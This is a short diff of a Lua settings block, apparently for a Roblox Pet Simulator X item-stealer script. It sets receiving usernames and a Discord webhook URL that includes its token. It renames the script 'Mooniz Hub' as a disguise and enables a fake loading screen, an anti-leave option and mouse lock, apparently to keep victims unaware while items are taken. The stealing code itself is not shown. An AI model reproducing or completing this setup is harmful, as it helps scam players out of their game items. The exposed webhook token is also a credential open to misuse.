@@ -1,6 +1,6 @@
 UserName = "petspsx651"
 Webhook = "https://discord.com/api/webhooks/1129531859051749426/BhM5VbwIJP7mfL0m8SDAW7zTOqUvGn7QGd2btSHPAeecIEeNLOMY9psLEgUWxMua7gNZ"
-UserName2 = "xYldrm"
+UserName2 = "petspsx751"
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
@@ -8,7 +8,7 @@ _G.MouseLock = true -- make it true if you want the mouselock
 
 -- Remove These If You're Not Using The Rizz LoadingScreen
 
-_G.ScriptName = "Script Name"
+_G.ScriptName = "Mooniz Hub"
 _G.FirstText = "Preparing..."
 _G.SecondText = "Loading..."
 _G.ThirdText = "Almost Done..."
